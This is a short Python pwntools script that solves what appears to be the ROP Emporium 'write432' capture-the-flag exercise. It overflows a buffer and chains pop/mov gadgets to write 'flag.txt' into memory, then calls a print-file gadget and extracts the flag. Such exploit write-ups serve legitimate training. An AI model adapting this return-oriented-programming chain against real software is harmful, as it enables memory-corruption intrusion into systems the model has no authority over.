from pwn import *

context.arch = "i386"
context.log_level = "critical"

printFileGadget = 0x08048538
movGadget = 0x08048543 # ebp -> (edi)
popGadget = 0x080485aa # pop edi; pop ebp; ret

targetAddress = 0x0804a018

bin = "./write432"
p = process(bin)

p.recvuntil("> ")

payload = [
	b"i"*44,

	p32(popGadget),
	p32(targetAddress),
	b"flag",
	p32(movGadget),

	p32(popGadget),
	p32(targetAddress+4),
	b".txt",
	p32(movGadget),

	p32(printFileGadget),
	p32(targetAddress)
]
p.sendline(b"".join(payload))

print(re.search(b"ROPE{(.+?)}", p.recvall()).group(0))
